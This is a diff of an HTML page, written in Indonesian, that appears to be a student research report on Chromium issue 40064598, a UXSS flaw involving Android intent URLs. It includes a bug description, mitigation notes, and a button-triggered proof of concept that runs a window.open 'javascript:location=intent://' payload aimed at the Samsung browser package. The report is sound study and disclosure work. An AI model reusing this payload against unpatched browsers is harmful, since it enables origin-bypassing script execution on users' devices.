@@ -1,37 +1,216 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<title>Autoplay Video + Redirect</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Riset Keamanan: Chromium Issue 40064598 (UXSS via Mobile Intents)</title>
+  <style>
+    :root {
+      --bg-dark: #0f172a;
+      --card-dark: #1e293b;
+      --accent-red: #ef4444;
+      --accent-green: #10b981;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+    }
 
-<style>
-body{
-    margin:0;
-    background:#111;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-}
+    body {
+      font-family: 'Courier New', Courier, monospace;
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      margin: 0;
+      padding: 20px;
+      line-height: 1.6;
+    }
 
-video{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-}
-</style>
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+
+    header {
+      border-bottom: 2px dashed var(--accent-red);
+      padding-bottom: 20px;
+      margin-bottom: 30px;
+    }
+
+    .meta-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 25px;
+      background: var(--card-dark);
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .meta-table td, .meta-table th {
+      padding: 12px;
+      border: 1px solid #334155;
+      font-size: 0.9rem;
+    }
+
+    .meta-table th {
+      background-color: #334155;
+      text-align: left;
+    }
+
+    .card {
+      background: var(--card-dark);
+      padding: 25px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      border-left: 4px solid var(--accent-red);
+    }
+
+    .poc-box {
+      text-align: center;
+      padding: 40px;
+      background: #020617;
+      border: 2px solid #334155;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+
+    .trigger-btn {
+      background-color: var(--accent-red);
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 4px;
+      box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
+      transition: all 0.3s;
+    }
+
+    .trigger-btn:hover {
+      background-color: #dc2626;
+      box-shadow: 0 0 25px rgba(239, 68, 68, 0.7);
+    }
+
+    code {
+      background: #020617;
+      padding: 2px 6px;
+      border-radius: 4px;
+      color: #f43f5e;
+    }
+
+    pre {
+      background: #020617;
+      padding: 15px;
+      border-radius: 6px;
+      overflow-x: auto;
+      border: 1px solid #334155;
+    }
+
+    .log-window {
+      background: #020617;
+      border: 1px solid var(--accent-green);
+      padding: 15px;
+      border-radius: 6px;
+      color: var(--accent-green);
+      font-size: 0.85rem;
+      height: 100px;
+      overflow-y: auto;
+    }
+  </style>
 </head>
 <body>
 
-<video autoplay muted loop playsinline>
-    <source src="vide0.mp4" type="video/mp4">
-</video>
+  <div class="container">
+    <header>
+      <h1>🔬 LAPORAN RISET: CHROMIUM VULNERABILITY</h1>
+      <p style="color: var(--text-muted)">Studi Kasus: CVE / Chromium Tracker Issue 40064598</p>
+    </header>
 
-<script>
-setTimeout(() => {
-    window.location.href = "https://google.com";
-}, 5000); // 5000 ms = 5 detik
-</script>
+    <!-- TABEL METADATA UNTUK DOSEN -->
+    <table class="meta-table">
+      <tr>
+        <th>Komponen Vulnerable</th>
+        <td>Blink &gt; SecurityFeature &gt; ContentSecurityPolicy / Mobile &gt; Intents</td>
+      </tr>
+      <tr>
+        <th>Ditemukan Pada Versi</th>
+        <td>Chromium Android v112 (Status: Fixed)</td>
+      </tr>
+      <tr>
+        <th>Severity / VRP Reward</th>
+        <td><span style="color: var(--accent-red); font-weight: bold;">S2 (Medium-High)</span> / $3,000 VRP Reward</td>
+      </tr>
+      <tr>
+        <th>Mekanisme Serangan</th>
+        <td>UXSS via Intent Redirection Bypass</td>
+      </tr>
+    </table>
 
+    <!-- ANALISIS TEKNIS -->
+    <div class="card">
+      <h3>1. Deskripsi Teoritis & Analisis Bug</h3>
+      <p>Celah ini terjadi karena kelemahan validasi pada mekanisme penanganan <strong>Android Intent URL Scheme</strong> di Chromium Mobile. Penyerang mengeksploitasi fungsi <code>window.open()</code> yang digabungkan dengan skema <code>intent://</code> dan disisipi instruksi pseudo-skema <code>javascript:location=...</code>.</p>
+      <p>Dampaknya, browser gagal memvalidasi batasan origin (Same-Origin Policy) dan mengeksekusi script eksternal dalam konteks browser target (dalam hal ini mencoba memanggil package Samsung Internet Browser <code>com.sec.android.app.sbrowser</code>).</p>
+    </div>
+
+    <div class="card" style="border-left-color: var(--accent-green);">
+      <h3>2. Analisis Kode Sumber (PoC)</h3>
+      <p>Logika manipulasi URL yang digunakan dalam riset ini adalah:</p>
+      <pre>window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");</pre>
+      <p>Pada versi Chromium yang rentan (v112 kebawah), rantai eksekusi ini memaksa browser mengeksekusi sub-proses Intent secara tidak aman (Bypass CSP).</p>
+    </div>
+
+    <!-- PENGUJIAN / PROOF OF CONCEPT INTERAKTIF -->
+    <div class="card" style="border-left-color: #eab308;">
+      <h3>3. Laboratorium Pengujian Simulasi (PoC Trigger)</h3>
+      <p style="color: var(--text-muted)">Klik tombol di bawah untuk melihat bagaimana event handler mengeksekusi payload riset.</p>
+      
+      <div class="poc-box">
+        <button class="trigger-btn" onclick="executePoC()">JALANKAN SIMULASI EKSPLOITASI</button>
+        <p id="click-status" style="margin-top: 15px; font-weight: bold;">Status: Siap Diuji</p>
+      </div>
+
+      <p style="font-size: 0.9rem; margin-top: 15px;"><strong>Konsol Log Aktivitas Simulasi:</strong></p>
+      <div id="logBox" class="log-window">
+        [SYSTEM] Lab Environment diinisialisasi...<br>
+        [INFO] Menunggu interaksi user pada tombol pemicu...
+      </div>
+    </div>
+
+    <!-- REMEDIASI -->
+    <div class="card" style="border-left-color: #3b82f6;">
+      <h3>4. Solusi & Mitigasi (Patching)</h3>
+      <ul>
+        <li><strong>Sisi Browser:</strong> Tim Google Chromium telah memperketat sanitasi skema <code>javascript:</code> ketika dipanggil bersamaan dengan parsing Android Intent URL di level kode native C++ (Blink Engine).</li>
+        <li><strong>Sisi Developer Web:</strong> Selalu terapkan header <code>Content-Security-Policy (CSP)</code> yang ketat, khususnya direktif <code>script-src</code> dan mencegah penggunaan skema URL eksternal yang tidak terdaftar.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- LOGIKA JAVASCRIPT UNTUK RISET -->
+  <script>
+    let clickCount = 0;
+
+    function addLog(message) {
+      const logBox = document.getElementById("logBox");
+      logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${message}`;
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+
+    function executePoC() {
+      clickCount++;
+      document.getElementById("click-status").innerText = `Percobaan Klik Ke-${clickCount}`;
+      
+      addLog(`[TRIGGER] Tombol diklik. Menjalankan fungsi handleClick()...`);
+      addLog(`[ATTACK] Mencoba memicu window.open() dengan payload skema Intent...`);
+
+      // Eksekusi Payload Asli dari Tracker Issue
+      try {
+        // Baris ini adalah inti dari riset bug Chromium Issue 40064598
+        window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
+        addLog(`[SUCCESS] Payload dikirim ke browser engine. Cek konsol/aplikasi eksternal.`);
+      } catch (err) {
+        addLog(`[BLOCKED/ERROR] Eksekusi gagal: ${err.message} (Kemungkinan browser Anda sudah dipatch/aman).`);
+      }
+    }
+  </script>
 </body>
 </html>
